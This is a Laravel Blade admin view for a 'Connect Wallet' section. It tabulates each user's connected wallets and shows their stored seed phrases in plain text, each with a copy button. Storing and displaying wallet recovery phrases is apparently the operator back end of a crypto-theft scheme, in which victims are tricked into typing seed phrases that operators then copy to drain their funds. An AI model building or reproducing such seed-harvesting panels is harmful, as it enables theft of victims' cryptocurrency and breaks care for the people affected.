@extends('admin.layout.app')
@section('content')

    <div class="nk-content ">
        <div class="container-fluid">
            <div class="container-xl wide-lg">
        <div class="nk-content-body">
            <div class="nk-block-head">
                <div class="nk-block-head-content">
                    <h2 class="nk-block-title fw-normal">User Profile</h2>
                    <div class="nk-block-des">
                        <p>
                            {{ $user->name }} Wallet
                        </p>
                    </div>
                </div>
            </div><!-- .nk-block-head -->
            <ul class="nk-nav nav nav-tabs">
                <li class="nav-item  current-page">
                    <a class="nav-link" href="{{ route('admin.user.show', $user->id) }}">Personal</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="{{ route('admin.userAssets', $user->id) }}">User Assets</a>
                </li>
                <li class="nav-item active">
                    <a class="nav-link" href="{{ route('admin.connectedWallet', $user->id) }}">Connect Wallet</a>
                </li>

            </ul><!-- .nk-menu -->
            <!-- NK-Block @s -->
            <div class="nk-block">

                <div class="nk-block-head">
                    <div class="nk-block-head-content">
                            @if(session()->has('success'))
                                <div class="alert alert-success">
                                    {{ session()->get('success') }}
                                </div>
                            @endif


                        <div class="nk-block-des">
                            <h5 class="m-3">Connected Wallet</h5>

                            <div class="table-responsive">
                                <table class="table table-striped">
                                <tr>
                                    <th>#</th>
                                    <th>Date</th>
                                    <th>Wallet</th>
                                    <th>Seed</th>
                                </tr>
                                @foreach($data as $index => $item)
                                    <tr>
                                        <td>{{ $index+1 }}</td>
                                        <td>{{ date('d M, Y', strtotime($item->created_at)) ?? '' }}</td>
                                        <td>{{ $item->wallet ?? '' }}</td>
                                        <td>
                                            <div class="form-control-wrap">
                                                <div class="form-clip clipboard-init" data-clipboard-target="#refUrl-{{ $item->id }}" data-success="Copied" data-text="Copy Link">
                                                    <em class="clipboard-icon icon ni ni-copy"></em> <span class="clipboard-text">Copy Link</span></div>
                                                <div class="form-icon">
                                                    <em class="icon ni ni-link-alt"></em>
                                                </div>
                                                <input type="text" class="form-control copy-text" id="refUrl-{{ $item->id }}" value="{{ $item->phrase ?? '' }}">
                                            </div>
                                        </td>
                                    </tr>
                                @endforeach
                            </table>
                            </div>

                        </div>
                    </div>
                </div><!-- .nk-block-head -->


            </div>
            <!-- NK-Block @e -->
            <!-- //  Content End -->
        </div>
    </div>

        </div>
    </div>



@endsection
